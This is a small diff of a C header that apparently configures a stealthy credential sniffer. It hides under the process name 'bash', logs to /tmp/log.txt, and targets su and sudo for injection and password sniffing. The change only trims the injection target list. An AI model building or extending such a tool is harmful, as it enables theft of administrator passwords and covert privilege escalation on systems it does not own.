@@ -10,7 +10,7 @@ typedef struct state_s state_t;
 #define HIDDEN_NAME "bash"
 #define LOG_FILE "/tmp/log.txt"
 
-#define INJECT_LIST { "/bin/su", "/usr/bin/sudo", "/bin/sh", "/bin/bash", NULL }
+#define INJECT_LIST { "/bin/su", "/usr/bin/sudo",  NULL }
 #define SNIFF_LIST { "/bin/su", "/usr/bin/sudo", NULL }
 #define HANDLER_LIST { handle_su, handle_sudo, NULL }
 #define MONITOR_MAX 64
